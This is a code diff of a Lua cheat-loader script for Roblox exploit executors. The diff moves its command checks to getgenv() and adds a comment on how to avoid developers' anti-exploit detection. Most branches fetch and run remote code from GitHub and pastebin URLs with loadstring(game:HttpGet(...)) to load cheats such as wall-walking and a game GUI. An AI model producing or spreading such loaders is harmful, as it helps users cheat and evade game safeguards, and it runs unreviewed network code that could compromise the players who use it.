@@ -1,4 +1,6 @@
-if _G.f == "GetJobId" then
+-- getgenv() is only avabiale for exploits like krnl,scriptware,synapxe etc.
+-- if you cant access getgenv then wait for the _G version(more dangerous as smart devs can use a for if statement to see what table name they didnt add and kick you(basicily and _G or anti exploit with _G thing))
+if getgenv().f == "GetJobId" then
 	function log(l1,l2)
 		local t = {l1,l2}
 		-- "If you cannot see the table contents, turn off log mode in the 3 dots in output!"
@@ -16,15 +18,15 @@ if _G.f == "GetJobId" then
 
 	toClipboard(game.JobId)
 end
-if _G.f == "exit" then
+if getgenv().f == "exit" then
 	game:shutdown()
 end
-if _G.f == "utg" then
+if getgenv().f == "utg" then
 	loadstring(game:HttpGet("https://raw.githubusercontent.com/Blukez/Scripts/main/UTG%20V3%20RAW"))()
 end
-if _G.f == "wallwalk" then
+if getgenv().f == "wallwalk" then
 	loadstring(game:HttpGetAsync("https://pastebin.com/raw/RY9cBbdG"))()
 end
-if _G.f == "controlplr" then
-	loadstring(game:HttpGet("https://raw.githubusercontent.com/Deez-Nuts445/GHSandbox_LUA_1/main/ControlPlrGui", true))()
+if getgenv().f == "gamegui" then
+	loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/Nicuse/RobloxScripts/main/InfectiousSmile.lua"))()
 end
